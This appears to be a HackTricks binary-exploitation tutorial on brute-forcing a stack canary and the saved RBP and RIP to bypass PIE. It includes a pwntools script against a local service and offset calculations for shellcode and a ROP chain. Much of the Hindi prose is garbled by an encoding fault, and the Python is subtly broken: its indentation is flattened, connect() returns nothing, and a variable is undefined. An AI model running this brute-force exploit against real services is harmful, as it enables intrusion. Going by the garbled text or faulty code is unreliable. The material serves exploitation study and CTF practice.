# BF Addresses in the Stack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**рдпрджрд┐ рдЖрдк рдПрдХ рдмрд╛рдЗрдирд░реА рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдЬреЛ рдПрдХ рдХреИрдирд░реА рдФрд░ PIE (рдкреЛрдЬреАрд╢рди рдЗрдВрдбрд┐рдкреЗрдВрдбреЗрдВрдЯ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓) рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рддреЛ рдЖрдкрдХреЛ рд╢рд╛рдпрдж рдЙрдиреНрд╣реЗрдВ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`checksec`** рдпрд╣ рдирд╣реАрдВ рдкрд╣рдЪрд╛рди рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреИрдирд░реА рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ рдпрджрд┐ рдЗрд╕реЗ рд╕реНрдерд┐рд░ рд░реВрдк рд╕реЗ рд╕рдВрдХрд▓рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдпрд╣ рдХрд╛рд░реНрдп рдХреЛ рдкрд╣рдЪрд╛рдирдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдЗрд╕реЗ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдорд╛рди рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рд╕реНрдЯреИрдХ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕ рдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдирд┐рдХрд╛рд╕реА рд╕реЗ рдкрд╣рд▓реЗ рдХреА рдЬрд╛рддреА рд╣реИред
{% endhint %}

## Brute-Force Addresses

PIE рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдХреБрдЫ рдкрддреЗ рд▓реАрдХ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред рдФрд░ рдпрджрд┐ рдмрд╛рдЗрдирд░реА рдХреЛрдИ рдкрддреЗ рд▓реАрдХ рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ, рддреЛ рдЗрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ **рдХрдордЬреЛрд░ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рд╕реНрдЯреИрдХ рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдирд╛ред**\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ **рдХреИрдирд░реА** рдФрд░ **PIE** рджреЛрдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдлрд┐рд░ **рдЕрдЧрд▓реЗ** 8 рдмрд╛рдЗрдЯреНрд╕ (x64) рд╕рд╣реЗрдЬреЗ рдЧрдП **RBP** рд╣реЛрдВрдЧреЗ рдФрд░ **рдЕрдЧрд▓реЗ** 8 рдмрд╛рдЗрдЯреНрд╕ рд╕рд╣реЗрдЬреЗ рдЧрдП **RIP** рд╣реЛрдВрдЧреЗред

{% hint style="success" %}
рдпрд╣ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рд╕реНрдЯреИрдХ рдХреЗ рдЕрдВрджрд░ рд▓реМрдЯрдиреЗ рд╡рд╛рд▓рд╛ рдкрддрд╛ рдореБрдЦреНрдп рдмрд╛рдЗрдирд░реА рдХреЛрдб рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ, рдЬреЛ, рдпрджрд┐ рдХрдордЬреЛрд░ рдмрд┐рдВрджреБ рдмрд╛рдЗрдирд░реА рдХреЛрдб рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ, рддреЛ рдЖрдорддреМрд░ рдкрд░ рдРрд╕рд╛ рд╣реА рд╣реЛрдЧрд╛ред
{% endhint %}

рдмрд╛рдЗрдирд░реА рд╕реЗ RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдорд╛рдиреНрдп рдЕрдиреБрдорд╛рдирд┐рдд рдмрд╛рдЗрдЯ рд╕рд╣реА рд╣реИ рдпрджрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреБрдЫ рдЖрдЙрдЯрдкреБрдЯ рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдпрд╣ рдмрд╕ рдХреНрд░реИрд╢ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред **рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рджрд╛рди рдХреА рдЧрдИ** **рд╕рдорд╛рди рдлрд╝рдВрдХреНрд╢рди** рдХрд╛ рдЙрдкрдпреЛрдЧ RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
The last thing you need to defeat the PIE is to calculate **рдЙрдкрдпреЛрдЧреА рдкрддреЗ** from the leaked **рдкрддреЗ**: the **RBP** and the **RIP**.

From the **RBP** you can calculate **рдЖрдкрдХрд╛ рд╢реЗрд▓ рд╕реНрдЯреИрдХ рдореЗрдВ рдХрд╣рд╛рдБ рд▓рд┐рдЦрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ**. This can be very useful to know **рдЖрдк рдХрд╣рд╛рдБ рд╕реНрдЯреНрд░рд┐рдВрдЧ _"/bin/sh\x00"_ рдХреЛ рд╕реНрдЯреИрдХ рдХреЗ рдЕрдВрджрд░ рд▓рд┐рдЦрдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ**. To calculate the distance between the leaked RBP and your shellcode you can just put a **рдмреНрд░реЗрдХрдкреЙрдЗрдВрдЯ RBP рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж** an check **рдЖрдкрдХрд╛ рд╢реЗрд▓рдХреЛрдб рдХрд╣рд╛рдБ рд╕реНрдерд┐рдд рд╣реИ**, then, you can calculate the distance between the shellcode and the RBP:
```python
INI_SHELLCODE = RBP - 1152
```
From the **RIP** you can calculate the **base address of the PIE binary** which is what you are going to need to create a **valid ROP chain**.\
To calculate the base address just do `objdump -d vunbinary` and check the disassemble latest addresses:

![](<../../../../.gitbook/assets/image (145).png>)

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╕рднреА рдХреЛрдб рдХреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ **1 рдмрд╛рдЗрдЯ рдФрд░ рдЖрдзрд╛** рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдлрд┐рд░, рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЖрдзрд╛рд░ рдкрддрд╛ **рд▓реАрдХ рдХрд┐рдП рдЧрдП RIP рдкрд░ "000" рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрдЧрд╛**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдиреЗ `0x562002970ecf` рд▓реАрдХ рдХрд┐рдпрд╛, рддреЛ рдЖрдзрд╛рд░ рдкрддрд╛ `0x562002970000` рд╣реИред
```python
elf.address = RIP - (RIP & 0xfff)
```
{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ AWS рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ GCP рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
